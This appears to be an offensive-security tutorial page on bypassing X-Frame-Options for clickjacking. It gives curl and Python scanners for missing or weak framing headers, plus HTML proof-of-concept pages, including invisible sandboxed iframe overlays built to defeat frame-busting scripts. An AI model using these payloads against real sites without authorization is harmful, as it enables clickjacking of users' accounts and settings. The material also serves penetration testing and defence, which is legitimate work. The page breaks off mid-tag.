---
title: X-Frame-Options Bypass
description: Bypassing X-Frame-Options protections covering all known techniques, detection, exploitation, payload crafting, header analysis, CSP conflicts, and advanced bypass methods.
navigation:
  icon: i-lucide-frame
  title: X-Frame-Options Bypass
---

## Overview

`X-Frame-Options` (XFO) is a security response header designed to prevent web pages from being embedded in iframes, protecting against clickjacking and UI redressing attacks. However, misconfigurations, implementation flaws, browser inconsistencies, and logical weaknesses can allow attackers to bypass this protection entirely.

::note
XFO bypass is critical for enabling clickjacking, likejacking, cursorjacking, strokejacking, and other UI redressing attacks. A successful bypass means the target page can be framed inside an attacker-controlled page.
::

### X-Frame-Options Values

| Value | Behavior | Browser Support |
| --- | --- | --- |
| `DENY` | Page cannot be framed by any site | All modern browsers |
| `SAMEORIGIN` | Page can only be framed by same origin | All modern browsers |
| `ALLOW-FROM uri` | Page can be framed only by specified URI | **Deprecated** — ignored by Chrome, Safari, modern Firefox, Edge |

### Why Bypasses Exist

::card-group
  ::card
  ---
  title: Inconsistent Headers
  icon: i-lucide-shuffle
  ---
  Different pages on the same application return different XFO values or miss the header entirely on certain endpoints.
  ::

  ::card
  ---
  title: ALLOW-FROM Deprecation
  icon: i-lucide-archive
  ---
  Servers relying solely on `ALLOW-FROM` have zero protection in modern browsers that ignore this directive.
  ::

  ::card
  ---
  title: CSP Conflicts
  icon: i-lucide-git-branch
  ---
  When both XFO and CSP `frame-ancestors` are present, browsers prioritize CSP. A permissive CSP overrides a restrictive XFO.
  ::

  ::card
  ---
  title: Proxy & CDN Stripping
  icon: i-lucide-cloud-off
  ---
  Reverse proxies, CDNs, load balancers, and caching layers can strip, modify, or fail to propagate the XFO header.
  ::

  ::card
  ---
  title: JavaScript Frame-Busting
  icon: i-lucide-code
  ---
  Applications that rely on JavaScript-based frame-busting instead of (or alongside) XFO can be bypassed via iframe sandbox attributes.
  ::

  ::card
  ---
  title: Double Headers
  icon: i-lucide-copy
  ---
  When the server sends multiple conflicting XFO headers, browser behavior is undefined and inconsistent, often resulting in the header being ignored.
  ::
::

---

## Reconnaissance & Detection

### Header Enumeration

::steps{level="4"}

#### Basic Header Check

```bash [Single URL Check]
# Check XFO header
curl -sI "https://target.com" | grep -i "x-frame-options"

# Check CSP frame-ancestors
curl -sI "https://target.com" | grep -i "content-security-policy" | grep -oi "frame-ancestors[^;]*"

# Check both together
curl -sI "https://target.com" | grep -iE "(x-frame-options|frame-ancestors)"

# Full security header audit
curl -sI "https://target.com" | grep -iE "^(x-frame|content-security|cross-origin-opener|cross-origin-embedder|cross-origin-resource|permissions-policy)"

# Show ALL response headers
curl -sI "https://target.com"

# Check with verbose to see redirect chain headers
curl -svI -L "https://target.com" 2>&1 | grep -iE "(< x-frame|< content-security|< location)"
```

#### Multi-Page Endpoint Scanning

```bash [Endpoint Enumeration]
# Check every endpoint for inconsistent XFO
ENDPOINTS=(
  /
  /login
  /register
  /signup
  /forgot-password
  /reset-password
  /profile
  /settings
  /account
  /dashboard
  /admin
  /api
  /api/v1
  /api/v2
  /oauth/authorize
  /oauth/consent
  /delete-account
  /change-password
  /change-email
  /transfer
  /payment
  /checkout
  /confirm
  /verify
  /2fa
  /mfa
  /sso
  /saml
  /callback
  /webhook
  /upload
  /download
  /export
  /import
  /share
  /invite
  /embed
  /widget
  /plugin
  /iframe
  /popup
  /modal
  /error
  /404
  /500
  /maintenance
  /health
  /status
  /robots.txt
  /sitemap.xml
  /.well-known/security.txt
)

echo "=== X-Frame-Options Consistency Check ==="
for ep in "${ENDPOINTS[@]}"; do
  url="https://target.com${ep}"
  status=$(curl -sI -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
  if [ "$status" != "000" ]; then
    xfo=$(curl -sI "$url" 2>/dev/null | grep -i "x-frame-options" | tr -d '\r\n' | xargs)
    csp_fa=$(curl -sI "$url" 2>/dev/null | grep -i "content-security-policy" | grep -oi "frame-ancestors[^;]*" | tr -d '\r\n' | xargs)

    if [ -z "$xfo" ] && [ -z "$csp_fa" ]; then
      echo "[VULN] $url (HTTP $status) — NO PROTECTION"
    elif [ -z "$xfo" ] && [ -n "$csp_fa" ]; then
      echo "[CSP ] $url (HTTP $status) — $csp_fa (no XFO)"
    elif [ -n "$xfo" ] && [ -z "$csp_fa" ]; then
      echo "[XFO ] $url (HTTP $status) — $xfo (no CSP)"
    else
      echo "[BOTH] $url (HTTP $status) — $xfo | $csp_fa"
    fi
  fi
done
```

#### HTTP Method Variation Testing

```bash [Method-Based Header Differences]
# Some servers only set XFO on GET, not on POST, OPTIONS, HEAD, etc.
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "[$method] "
  curl -sI -X "$method" "https://target.com/" 2>/dev/null | grep -i "x-frame-options" || echo "NO XFO"
done

# Test with different Content-Types
curl -sI -X POST "https://target.com/" -H "Content-Type: application/json" | grep -i "x-frame"
curl -sI -X POST "https://target.com/" -H "Content-Type: application/x-www-form-urlencoded" | grep -i "x-frame"
curl -sI -X POST "https://target.com/" -H "Content-Type: multipart/form-data" | grep -i "x-frame"
curl -sI -X POST "https://target.com/" -H "Content-Type: text/xml" | grep -i "x-frame"
```

#### User-Agent & Context Variation

```bash [Context-Based Header Differences]
# Desktop browsers
curl -sI -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "https://target.com" | grep -i "x-frame"

# Mobile browsers
curl -sI -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" "https://target.com" | grep -i "x-frame"
curl -sI -A "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" "https://target.com" | grep -i "x-frame"

# Bot / Crawler
curl -sI -A "Googlebot/2.1 (+http://www.google.com/bot.html)" "https://target.com" | grep -i "x-frame"
curl -sI -A "curl/8.0" "https://target.com" | grep -i "x-frame"

# No User-Agent
curl -sI -H "User-Agent: " "https://target.com" | grep -i "x-frame"

# Old browsers (IE mode)
curl -sI -A "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)" "https://target.com" | grep -i "x-frame"

# WebView
curl -sI -A "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 wv" "https://target.com" | grep -i "x-frame"
```

#### Authenticated vs Unauthenticated

```bash [Auth State Header Differences]
# Unauthenticated
curl -sI "https://target.com/dashboard" | grep -i "x-frame"

# Authenticated (replace with valid cookie)
curl -sI "https://target.com/dashboard" -H "Cookie: session=VALID_SESSION_COOKIE" | grep -i "x-frame"

# With Bearer token
curl -sI "https://target.com/api/profile" -H "Authorization: Bearer VALID_TOKEN" | grep -i "x-frame"

# After login redirect
curl -sIL "https://target.com/login" -d "user=test&pass=test" | grep -iE "(x-frame|location)"
```

::

### Automated Scanning

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Mass Scanning"}

  ```bash [Large-Scale XFO Detection]
  # httpx — fast header scanning
  cat urls.txt | httpx -silent -include-response-header \
    | grep -viE "x-frame-options" \
    | cut -d' ' -f1 \
    | tee no_xfo.txt

  # httpx with specific header extraction
  cat urls.txt | httpx -silent \
    -H "x-frame-options" \
    -H "content-security-policy" \
    -status-code -title \
    -o header_scan.txt

  # Nuclei clickjacking templates
  nuclei -l urls.txt -tags clickjacking -severity info,low,medium,high -o nuclei_results.txt

  # Custom nuclei template for XFO analysis
  cat << 'EOF' > xfo-bypass-check.yaml
  id: xfo-bypass-detection
  info:
    name: X-Frame-Options Bypass Detection
    severity: medium
    tags: clickjacking,xfo,bypass
    description: Detects missing, weak, or bypassable X-Frame-Options configurations
  http:
    - method: GET
      path:
        - "{{BaseURL}}"
        - "{{BaseURL}}/login"
        - "{{BaseURL}}/settings"
        - "{{BaseURL}}/oauth/authorize"
      matchers-condition: or
      matchers:
        - type: word
          name: no-protection
          words:
            - "X-Frame-Options"
            - "frame-ancestors"
          part: header
          negative: true
          condition: and
        - type: regex
          name: allow-from-deprecated
          part: header
          regex:
            - "(?i)x-frame-options:\\s*allow-from"
        - type: regex
          name: invalid-xfo-value
          part: header
          regex:
            - "(?i)x-frame-options:\\s*(?!DENY|SAMEORIGIN|ALLOW-FROM)"
        - type: word
          name: csp-report-only-frame-ancestors
          part: header
          words:
            - "content-security-policy-report-only"
          condition: and
  EOF

  nuclei -l urls.txt -t xfo-bypass-check.yaml -o xfo_bypass_results.txt

  # Meg — fetch headers for many paths on one host
  meg -c 50 -v / /login /settings /admin /api /oauth < hosts.txt
  grep -riL "x-frame-options" out/ | tee missing_xfo_paths.txt
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Scanner"}

  ```python [xfo_bypass_scanner.py]
  #!/usr/bin/env python3
  """
  X-Frame-Options Bypass Scanner
  Detects all known XFO weaknesses and bypass vectors
  """
  import requests
  import re
  import sys
  from urllib.parse import urlparse

  class XFOBypassScanner:
      def __init__(self):
          self.session = requests.Session()
          self.session.headers.update({
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          })
          self.timeout = 10
          self.findings = []

      def scan(self, url):
          self.findings = []
          try:
              r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
              h = {k.lower(): v for k, v in r.headers.items()}

              self._check_xfo_missing(h, url)
              self._check_xfo_allow_from(h, url)
              self._check_xfo_invalid(h, url)
              self._check_xfo_duplicate(r, url)
              self._check_csp_override(h, url)
              self._check_csp_report_only(h, url)
              self._check_csp_meta_tag(r.text, url)
              self._check_csp_wildcard(h, url)
              self._check_js_framebusting(r.text, url)
              self._check_xfo_case_sensitivity(h, r, url)
              self._check_partial_path(url)

          except Exception as e:
              self.findings.append(("ERROR", url, str(e)))

          return self.findings

      def _check_xfo_missing(self, headers, url):
          xfo = headers.get("x-frame-options", "")
          csp = headers.get("content-security-policy", "")
          if not xfo and "frame-ancestors" not in csp:
              self.findings.append(("CRITICAL", url,
                  "No X-Frame-Options AND no CSP frame-ancestors — fully frameable"))

      def _check_xfo_allow_from(self, headers, url):
          xfo = headers.get("x-frame-options", "")
          if "allow-from" in xfo.lower():
              self.findings.append(("HIGH", url,
                  f"X-Frame-Options: ALLOW-FROM detected — deprecated, "
                  f"ignored by Chrome/Safari/Edge/Firefox 70+. Value: {xfo}"))

      def _check_xfo_invalid(self, headers, url):
          xfo = headers.get("x-frame-options", "").strip()
          if xfo and xfo.upper() not in ["DENY", "SAMEORIGIN"] and \
             "ALLOW-FROM" not in xfo.upper():
              self.findings.append(("HIGH", url,
                  f"Invalid X-Frame-Options value: '{xfo}' — browsers ignore invalid values"))

      def _check_xfo_duplicate(self, response, url):
          xfo_headers = [v for k, v in response.headers.items()
                        if k.lower() == "x-frame-options"]
          if len(xfo_headers) > 1:
              self.findings.append(("HIGH", url,
                  f"Multiple X-Frame-Options headers detected: {xfo_headers} — "
                  f"conflicting values cause browsers to ignore XFO entirely"))

      def _check_csp_override(self, headers, url):
          xfo = headers.get("x-frame-options", "")
          csp = headers.get("content-security-policy", "")
          if xfo and "frame-ancestors" in csp:
              fa_match = re.search(r"frame-ancestors\s+([^;]+)", csp)
              if fa_match:
                  fa_val = fa_match.group(1).strip()
                  if fa_val == "*" or "http:" in fa_val:
                      self.findings.append(("HIGH", url,
                          f"CSP frame-ancestors ({fa_val}) overrides XFO ({xfo}). "
                          f"CSP takes precedence — frameable!"))

      def _check_csp_report_only(self, headers, url):
          csp_ro = headers.get("content-security-policy-report-only", "")
          xfo = headers.get("x-frame-options", "")
          csp = headers.get("content-security-policy", "")
          if "frame-ancestors" in csp_ro and not xfo and "frame-ancestors" not in csp:
              self.findings.append(("HIGH", url,
                  "frame-ancestors only in Report-Only CSP — NOT enforced, page is frameable"))

      def _check_csp_meta_tag(self, body, url):
          if re.search(r'<meta[^>]*content-security-policy[^>]*frame-ancestors', body, re.I):
              self.findings.append(("MEDIUM", url,
                  "frame-ancestors found in <meta> CSP tag — browsers IGNORE "
                  "frame-ancestors in meta tags"))

      def _check_csp_wildcard(self, headers, url):
          csp = headers.get("content-security-policy", "")
          fa_match = re.search(r"frame-ancestors\s+([^;]+)", csp)
          if fa_match:
              fa_val = fa_match.group(1).strip()
              if fa_val == "*":
                  self.findings.append(("HIGH", url,
                      "CSP frame-ancestors: * — allows framing from ANY origin"))
              elif re.search(r'\*\.\w+', fa_val):
                  self.findings.append(("MEDIUM", url,
                      f"CSP frame-ancestors uses wildcard subdomain: {fa_val} — "
                      f"subdomain takeover = bypass"))
              if "http:" in fa_val:
                  self.findings.append(("MEDIUM", url,
                      f"CSP frame-ancestors allows http:// origins: {fa_val} — "
                      f"MITM downgrade possible"))

      def _check_js_framebusting(self, body, url):
          patterns = [
              r"if\s*\(\s*top\s*!==?\s*self",
              r"if\s*\(\s*window\.top\s*!==?\s*window\.self",
              r"if\s*\(\s*self\s*!==?\s*top",
              r"if\s*\(\s*parent\.frames\.length",
              r"if\s*\(\s*window\.frameElement",
              r"top\.location\s*=\s*self\.location",
              r"top\.location\s*=\s*location",
              r"top\.location\.replace",
              r"top\.location\.href\s*=",
              r"framekiller|frame-killer|bustframe|frame.?bust",
          ]
          for pat in patterns:
              if re.search(pat, body, re.I):
                  self.findings.append(("MEDIUM", url,
                      f"JavaScript frame-busting detected (pattern: {pat}) — "
                      f"bypassable with sandbox attribute"))
                  break

      def _check_xfo_case_sensitivity(self, headers, response, url):
          raw_headers = str(response.headers)
          xfo_variants = re.findall(r'(X-Frame-Options|x-frame-options|X-FRAME-OPTIONS)',
                                     raw_headers, re.I)
          if len(set(v.lower() for v in xfo_variants)) > 0:
              xfo_val = headers.get("x-frame-options", "")
              if xfo_val:
                  upper = xfo_val.upper()
                  if xfo_val != upper and xfo_val != upper.capitalize():
                      self.findings.append(("LOW", url,
                          f"XFO value has unusual casing: '{xfo_val}' — "
                          f"some proxies may not recognize it"))

      def _check_partial_path(self, url):
          parsed = urlparse(url)
          test_paths = [
              parsed.path + "?" if "?" not in url else url + "&_=1",
              parsed.path + "/",
              parsed.path + "/.",
              parsed.path + "%20",
              parsed.path + "%00",
              parsed.path + ";",
              parsed.path.rstrip("/") + ".html",
              parsed.path.rstrip("/") + ".json",
              parsed.path.rstrip("/") + ".xml",
          ]
          base = f"{parsed.scheme}://{parsed.netloc}"
          for path in test_paths[:5]:
              try:
                  r = self.session.get(base + path, timeout=self.timeout,
                                       allow_redirects=True)
                  h = {k.lower(): v for k, v in r.headers.items()}
                  xfo = h.get("x-frame-options", "")
                  csp_fa = "frame-ancestors" in h.get("content-security-policy", "")
                  if not xfo and not csp_fa and r.status_code == 200:
                      self.findings.append(("HIGH", base + path,
                          f"Path variation bypasses XFO: {path}"))
              except:
                  pass

      def print_findings(self):
          if not self.findings:
              print("  [✓] No bypass vectors found")
              return

          colors = {
              "CRITICAL": "\033[91m",
              "HIGH": "\033[91m",
              "MEDIUM": "\033[93m",
              "LOW": "\033[94m",
              "ERROR": "\033[90m"
          }
          reset = "\033[0m"

          for severity, url, detail in self.findings:
              color = colors.get(severity, "")
              print(f"  {color}[{severity}]{reset} {detail}")
              print(f"         URL: {url}")
              print()

  if __name__ == "__main__":
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <url|file>")
          sys.exit(1)

      scanner = XFOBypassScanner()
      target = sys.argv[1]

      targets = []
      if target.startswith("http"):
          targets = [target]
      else:
          with open(target) as f:
              targets = [l.strip() for l in f if l.strip()]

      for t in targets:
          print(f"\n{'='*60}")
          print(f"Scanning: {t}")
          print(f"{'='*60}")
          scanner.scan(t)
          scanner.print_findings()
  ```

  :::

  :::tabs-item{icon="i-lucide-search" label="Burp Suite"}

  ```bash [Burp Suite Workflow]
  # 1. Proxy target through Burp
  # 2. Spider/Crawl entire application
  # 3. Go to Proxy > HTTP History
  # 4. Filter responses and add column for X-Frame-Options

  # 5. Use Burp Search (Ctrl+F in HTTP History):
  #    - Search Response Headers for "x-frame-options"
  #    - Identify pages WITHOUT the header
  #    - Identify pages with ALLOW-FROM

  # 6. Use Burp Comparer:
  #    - Compare responses from different endpoints
  #    - Find inconsistent XFO policies

  # 7. Use Match & Replace to test:
  #    Type: Response Header
  #    Match: ^X-Frame-Options:.*$
  #    Replace: (empty)
  #    → This removes XFO from all responses for local testing

  # 8. Burp Clickbandit:
  #    Burp Menu > Burp Clickbandit
  #    → Generates clickjacking PoC automatically

  # 9. Extensions:
  #    - "Clickjacking Scanner" from BApp Store
  #    - "CSP Auditor" for frame-ancestors analysis
  #    - "Param Miner" to find hidden parameters that might disable XFO
  ```

  :::
::

---

## Bypass Techniques

### Bypass 1 — ALLOW-FROM Deprecation

The `ALLOW-FROM` directive is deprecated and ignored by all modern browsers. If the server relies solely on `ALLOW-FROM` without CSP `frame-ancestors`, the page is frameable.

```bash [Detection]
# Check if ALLOW-FROM is the only protection
curl -sI "https://target.com" | grep -iE "(x-frame|frame-ancestors)"

# Expected vulnerable output:
# X-Frame-Options: ALLOW-FROM https://trusted-partner.com
# (no CSP frame-ancestors line)
```

```bash [Browser Support Matrix]
# ALLOW-FROM support:
# Chrome      → IGNORED (all versions)
# Firefox 70+ → IGNORED
# Firefox <70 → Supported
# Safari      → IGNORED (all versions)
# Edge (new)  → IGNORED
# Edge (old)  → Supported
# IE 11       → Supported
# Opera       → IGNORED
```

```html [ALLOW-FROM Bypass PoC]
<!--
  If server only returns: X-Frame-Options: ALLOW-FROM https://trusted.com
  Modern browsers ignore this — page loads in iframe normally
-->
<!DOCTYPE html>
<html>
<head><title>ALLOW-FROM Bypass</title></head>
<body>
    <h2>ALLOW-FROM Bypass — Page should load below in modern browsers</h2>
    <iframe src="https://target.com/sensitive-page"
        width="100%" height="600"
        style="border:2px solid red;">
    </iframe>
    <script>
        // Verify the iframe loaded
        setTimeout(function() {
            var frame = document.querySelector('iframe');
            try {
                // Can't access cross-origin content but we can check if loaded
                console.log('[+] iframe loaded — ALLOW-FROM bypass successful');
            } catch(e) {
                console.log('[+] iframe loaded (cross-origin)');
            }
        }, 3000);
    </script>
</body>
</html>
```

---

### Bypass 2 — Duplicate / Conflicting Headers

When the server sends multiple `X-Frame-Options` headers with different values, browser behavior becomes undefined. Most browsers ignore XFO entirely when conflicting values are detected.

```bash [Detection]
# Check for duplicate XFO headers
curl -sI "https://target.com" | grep -ci "x-frame-options"
# If count > 1, potential bypass

# View all XFO header instances
curl -sI "https://target.com" | grep -i "x-frame-options"
# Vulnerable example output:
# X-Frame-Options: DENY
# X-Frame-Options: SAMEORIGIN

# Common cause: application sets one value, reverse proxy adds another
# Or: load balancer adds header, backend also adds header
```

```bash [Trigger Duplicate Headers via Proxy]
# Some reverse proxies add XFO even if backend already sets it
# Backend: X-Frame-Options: SAMEORIGIN
# Proxy:   X-Frame-Options: DENY
# Result:  Two conflicting headers → browsers may ignore both

# Test by adding custom headers that might cause duplication
curl -sI "https://target.com" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  | grep -i "x-frame-options"

# Test with different protocols
curl -sI "http://target.com" | grep -i "x-frame-options"
curl -sI "https://target.com" | grep -i "x-frame-options"
```

```html [Duplicate Header Bypass PoC]
<!--
  When server sends:
  X-Frame-Options: DENY
  X-Frame-Options: SAMEORIGIN

  Chrome and Firefox behavior:
  - Chrome: May ignore both, allowing framing
  - Firefox: May use first or ignore both
  - Safari: May use first header only
-->
<!DOCTYPE html>
<html>
<head><title>Duplicate XFO Bypass Test</title></head>
<body>
    <h2>Testing duplicate X-Frame-Options bypass</h2>
    <iframe id="testFrame" src="https://target.com"
        width="100%" height="500"
        style="border:2px solid orange;"
        onload="document.getElementById('status').textContent='LOADED — Bypass works!'"
        onerror="document.getElementById('status').textContent='BLOCKED'">
    </iframe>
    <p id="status" style="font-size:20px; font-weight:bold;">Loading...</p>
</body>
</html>
```

---

### Bypass 3 — Invalid Header Values

If the server sets an unrecognized XFO value, browsers ignore the entire header.

```bash [Detection]
curl -sI "https://target.com" | grep -i "x-frame-options"

# Vulnerable examples:
# X-Frame-Options: ALLOWALL
# X-Frame-Options: allow
# X-Frame-Options: yes
# X-Frame-Options: no
# X-Frame-Options: true
# X-Frame-Options: false
# X-Frame-Options: none
# X-Frame-Options: INVALID
# X-Frame-Options: deny, sameorigin    ← comma-separated (invalid)
# X-Frame-Options: SAMEORIGIN; DENY    ← semicolon-separated (invalid)
# X-Frame-Options:                     ← empty value
# X-Frame-Options: DENY SAMEORIGIN     ← space-separated (invalid)
```

```bash [Automated Invalid Value Detection]
# Script to categorize XFO values
curl -sI "https://target.com" | grep -i "x-frame-options" | while read line; do
  value=$(echo "$line" | cut -d: -f2- | xargs | tr '[:lower:]' '[:upper:]')
  case "$value" in
    "DENY") echo "[VALID] $line" ;;
    "SAMEORIGIN") echo "[VALID] $line" ;;
    ALLOW-FROM*) echo "[DEPRECATED] $line — Ignored by modern browsers" ;;
    "") echo "[INVALID] Empty value — Ignored by browsers" ;;
    *) echo "[INVALID] '$value' — Not a recognized value, ignored by browsers" ;;
  esac
done
```

```html [Invalid Value Bypass PoC]
<!--
  Server returns: X-Frame-Options: ALLOWALL
  This is NOT a valid value → browsers ignore it entirely
-->
<!DOCTYPE html>
<html>
<body>
    <h2>Invalid XFO Value Bypass</h2>
    <p>If the server sends an invalid X-Frame-Options value, browsers ignore it.</p>
    <iframe src="https://target.com" width="100%" height="500"
        style="border:2px solid yellow;">
    </iframe>
</body>
</html>
```

---

### Bypass 4 — CSP frame-ancestors Override

When both `X-Frame-Options` and `Content-Security-Policy frame-ancestors` are present, **CSP takes precedence** in all modern browsers. A permissive CSP overrides a restrictive XFO.

```bash [Detection]
# Check for conflicting XFO and CSP
curl -sI "https://target.com" | grep -iE "(x-frame-options|content-security-policy)" | head -5

# Vulnerable scenario:
# X-Frame-Options: DENY
# Content-Security-Policy: frame-ancestors * ;
# → CSP wins → page is frameable from anywhere!

# Another vulnerable scenario:
# X-Frame-Options: DENY
# Content-Security-Policy: frame-ancestors 'self' https://partner.com https://*.cdn.com ;
# → CSP wins → frameable from partner.com and any cdn.com subdomain

# Check which directive actually applies
echo "--- XFO ---"
curl -sI "https://target.com" | grep -i "x-frame-options"
echo "--- CSP frame-ancestors ---"
curl -sI "https://target.com" | grep -i "content-security-policy" | grep -oi "frame-ancestors[^;]*"
```

```bash [CSP frame-ancestors Analysis]
# Extract and analyze frame-ancestors value
FA=$(curl -sI "https://target.com" | grep -i "content-security-policy" | grep -oi "frame-ancestors[^;]*")
echo "frame-ancestors value: $FA"

# Check for weak values
echo "$FA" | grep -q '\*' && echo "[VULN] Wildcard — allows all origins"
echo "$FA" | grep -q 'http:' && echo "[VULN] HTTP origin — MITM downgrade possible"
echo "$FA" | grep -qE '\*\.\w+' && echo "[VULN] Wildcard subdomain — subdomain takeover"
echo "$FA" | grep -q 'data:' && echo "[VULN] data: URI allowed"
echo "$FA" | grep -q 'blob:' && echo "[VULN] blob: URI allowed"

# If frame-ancestors has trusted domains, check for subdomain takeover
DOMAINS=$(echo "$FA" | grep -oE 'https?://[^ ]+' | sed 's|https\?://||')
for domain in $DOMAINS; do
  echo -n "Checking $domain: "
  dig +short "$domain" | head -1 || echo "NXDOMAIN — possible takeover"
done
```

```html [CSP Override Bypass PoC]
<!--
  Server sends:
  X-Frame-Options: DENY
  Content-Security-Policy: frame-ancestors *

  CSP frame-ancestors overrides XFO in all modern browsers
-->
<!DOCTYPE html>
<html>
<head><title>CSP Overrides XFO</title></head>
<body>
    <h2>CSP frame-ancestors * overrides X-Frame-Options: DENY</h2>
    <iframe src="https://target.com" width="100%" height="600"
        style="border:2px solid green;">
    </iframe>
</body>
</html>
```

---

### Bypass 5 — CSP Report-Only Mode

`Content-Security-Policy-Report-Only` does **not enforce** any restrictions. If `frame-ancestors` is only specified in the report-only header, it provides zero protection.

```bash [Detection]
# Check for Report-Only CSP
curl -sI "https://target.com" | grep -i "content-security-policy-report-only"

# Vulnerable scenario:
# Content-Security-Policy-Report-Only: frame-ancestors 'none'
# (no X-Frame-Options header)
# (no enforced CSP with frame-ancestors)
# → Report-Only is NOT enforced → page is frameable

# Check if enforced CSP also exists
curl -sI "https://target.com" | grep -i "content-security-policy" | grep -v "report-only"
```

```html [Report-Only Bypass PoC]
<!DOCTYPE html>
<html>
<body>
    <h2>CSP Report-Only Bypass</h2>
    <p>frame-ancestors in Report-Only CSP is NOT enforced</p>
    <iframe src="https://target.com" width="100%" height="500"
        style="border:2px solid purple;">
    </iframe>
</body>
</html>
```

---

### Bypass 6 — Meta Tag frame-ancestors

Browsers **ignore** `frame-ancestors` when specified in HTML `<meta>` tags. This directive only works when delivered via HTTP response headers.

```bash [Detection]
# Check if frame-ancestors is only in meta tag (not in headers)

# Check headers — missing frame-ancestors
curl -sI "https://target.com" | grep -i "frame-ancestors"
# (empty = no frame-ancestors in headers)

# Check HTML body for meta tag CSP
curl -s "https://target.com" | grep -iE '<meta[^>]*content-security-policy[^>]*>' | grep -i "frame-ancestors"

# If frame-ancestors is ONLY in meta tag → NO protection
```

```html [Meta Tag Bypass Verification]
<!--
  Target page has:
  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">

  But NO X-Frame-Options header
  And NO CSP frame-ancestors in response headers

  Result: frame-ancestors in meta tag is IGNORED → page is frameable
-->
<!DOCTYPE html>
<html>
<body>
    <h2>Meta Tag frame-ancestors Bypass</h2>
    <p>Browsers ignore frame-ancestors in meta tags</p>
    <iframe src="https://target.com" width="100%" height="500"
        style="border:2px solid cyan;">
    </iframe>
</body>
</html>
```

---

### Bypass 7 — JavaScript Frame-Busting Bypass

Applications that use JavaScript-based frame-busting instead of (or alongside) XFO headers can be bypassed using iframe `sandbox` attribute.

```bash [Detection]
# Find JS frame-busting code
curl -s "https://target.com" | grep -iE "(top\.location|self\.location|parent\.location|window\.top|frameElement|top\s*!==|top\s*!=|framekiller|bustframe)"

# Common frame-busting patterns:
# if (top !== self) top.location = self.location;
# if (window.top !== window.self) { top.location.href = self.location.href; }
# if (parent.frames.length > 0) { top.location.replace(document.location); }
# if (window.frameElement) { window.top.location = window.location; }
# try { top.location.hostname; } catch(e) { top.location.href = self.location.href; }

# Also check external JS files
curl -s "https://target.com" | grep -oE 'src="[^"]*\.js"' | while read src; do
  jsurl=$(echo "$src" | grep -oE '"[^"]*"' | tr -d '"')
  echo "=== Checking: $jsurl ==="
  curl -s "https://target.com/$jsurl" | grep -iE "(top\.location|frameElement|framekiller)" && echo "[FOUND]" || echo "[clean]"
done
```

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="Sandbox Bypass"}

  ```html [Sandbox Attribute Bypass]
  <!--
    sandbox attribute disables JavaScript in the iframe.
    This prevents JS-based frame-busting from executing.
  -->

  <!-- Block ALL scripts (strongest bypass) -->
  <iframe sandbox src="https://target.com" width="100%" height="500"
      style="border:none; opacity:0; position:absolute; z-index:10;">
  </iframe>

  <!-- Allow forms (needed for CSRF/form submission attacks) -->
  <iframe sandbox="allow-forms" src="https://target.com/settings"
      width="100%" height="500"
      style="border:none; opacity:0; position:absolute; z-index:10;">
  </iframe>

  <!-- Allow forms + same-origin (cookies sent, JS blocked) -->
  <iframe sandbox="allow-forms allow-same-origin" src="https://target.com"
      width="100%" height="500">
  </iframe>

  <!-- Allow forms + popups (some actions open popups) -->
  <iframe sandbox="allow-forms allow-popups" src="https://target.com"
      width="100%" height="500">
  </iframe>

  <!--
    WARNING: allow-scripts + allow-same-origin together
    allows the iframe to REMOVE its own sandbox attribute!
    The framed page can run:
      document.querySelector('iframe').removeAttribute('sandbox');
    Use this combination only if needed and you accept the risk.
  -->
  <iframe sandbox="allow-scripts allow-same-origin allow-forms"
      src="https://target.com">
  </iframe>
  ```

  ```html [Comprehensive Sandbox Bypass Testing]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Sandbox Bypass Testing Matrix</title>
      <style>
          body { background:#111; color:white; font-family:monospace; padding:20px; }
          .test { margin:15px 0; padding:10px; background:#1a1a1a; border-radius:6px; }
          .test h4 { margin:0 0 5px 0; color:#4ecdc4; }
          iframe { border:2px solid #333; margin:5px 0; }
          .result { font-size:14px; margin-top:5px; }
      </style>
  </head>
  <body>
      <h1>🧪 Sandbox Frame-Buster Bypass Matrix</h1>
      <p>Testing which sandbox values bypass JS frame-busting on target</p>

      <div class="test">
          <h4>Test 1: sandbox="" (block everything)</h4>
          <iframe sandbox src="https://target.com" width="800" height="100"
              onload="this.nextElementSibling.innerHTML='✅ LOADED'"
              onerror="this.nextElementSibling.innerHTML='❌ BLOCKED'">
          </iframe>
          <div class="result">⏳ Loading...</div>
      </div>

      <div class="test">
          <h4>Test 2: sandbox="allow-forms"</h4>
          <iframe sandbox="allow-forms" src="https://target.com" width="800" height="100"
              onload="this.nextElementSibling.innerHTML='✅ LOADED'"
              onerror="this.nextElementSibling.innerHTML='❌ BLOCKED'">
          </iframe>
          <div class="result">⏳ Loading...</div>
      </div>

      <div class="test">
          <h4>Test 3: sandbox="allow-forms allow-same-origin"</h4>
          <iframe sandbox="allow-forms allow-same-origin" src="https://target.com"
              width="800" height="100"
              onload="this.nextElementSibling.innerHTML='✅ LOADED'"
              onerror="this.nextElementSibling.innerHTML='❌ BLOCKED'">
          </iframe>
          <div class="result">⏳ Loading...</div>
      </div>

      <div class="test">
          <h4>Test 4: sandbox="allow-forms allow-same-origin allow-popups"</h4>
          <iframe sandbox="allow-forms allow-same-origin allow-popups" src="https://target.com"
              width="800" height="100"
              onload="this.nextElementSibling.innerHTML='✅ LOADED'"
